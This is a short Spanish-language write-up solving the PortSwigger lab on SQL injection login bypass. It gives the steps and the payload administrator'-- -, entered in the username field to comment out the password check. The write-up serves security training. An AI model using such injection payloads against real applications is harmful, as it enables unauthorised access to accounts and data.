# Lab: SQL injection vulnerability allowing login bypass

- [Lab: SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

## Descripción:

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

---

### Explicación:

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/49b83b5c-02a2-4733-a894-def831e0242b)

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/836a0bdb-2069-492c-b109-6dce5b4824e9)

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/32cf2b6f-58ef-4e79-8fc0-fe52d18b4d6d)

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/4cd5611e-0aac-435f-a45d-4a254b669186)


## Solución:

1. Abrir laboratorio y buscar en donde me puedo autenticar

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/dfe5453b-1098-4799-a0fd-a7a940683d9f)


2. Aquí encuentro donde puedo hacer inputs de strings

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/e6481b91-47f2-4b54-8cc9-0d036d9d99a1)


3. Query que usé (lo puse en ambos campos, aunque se puede usar en el primero y el segundo lo que sea...)

````sql
administrator'-- -
````
````http
Username: administrator'-- -
Password: Lo que sea...
````

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/95856f02-84de-4067-a9af-65183b9bb6a9)





